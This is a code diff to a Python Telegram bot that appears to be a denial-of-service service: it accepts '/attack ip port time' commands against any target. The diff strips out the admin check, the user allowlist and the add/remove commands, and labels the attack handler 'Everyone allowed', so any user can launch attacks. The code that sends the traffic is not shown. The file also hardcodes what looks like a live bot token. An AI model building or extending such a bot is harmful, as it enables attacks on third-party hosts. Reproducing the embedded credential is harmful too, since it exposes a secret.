@@ -3,42 +3,13 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
 TOKEN = "8672083948:AAGa0UxQS1jurCzpNKG2fJ6FOyetBGye7ZE"
-ADMIN_ID = 8675518468
-
-# simple user list (no DB)
-allowed_users = set()
 
 # START
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("🔥 Bot Active\nUse /attack ip port time")
 
-# ADD USER (admin)
-async def add(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
-        return
-    
-    user_id = int(context.args[0])
-    allowed_users.add(user_id)
-
-    await update.message.reply_text(f"✅ User {user_id} added")
-
-# REMOVE USER
-async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
-        return
-    
-    user_id = int(context.args[0])
-    allowed_users.discard(user_id)
-
-    await update.message.reply_text(f"❌ User {user_id} removed")
-
-# ATTACK
+# ATTACK (Everyone allowed)
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-
-    if user_id not in allowed_users:
-        await update.message.reply_text("❌ Not allowed")
-        return
 
     if len(context.args) != 3:
         await update.message.reply_text("Use: /attack ip port time")
@@ -61,8 +32,6 @@ def main():
     app = Application.builder().token(TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("add", add))
-    app.add_handler(CommandHandler("remove", remove))
     app.add_handler(CommandHandler("attack", attack))
 
     app.run_polling()
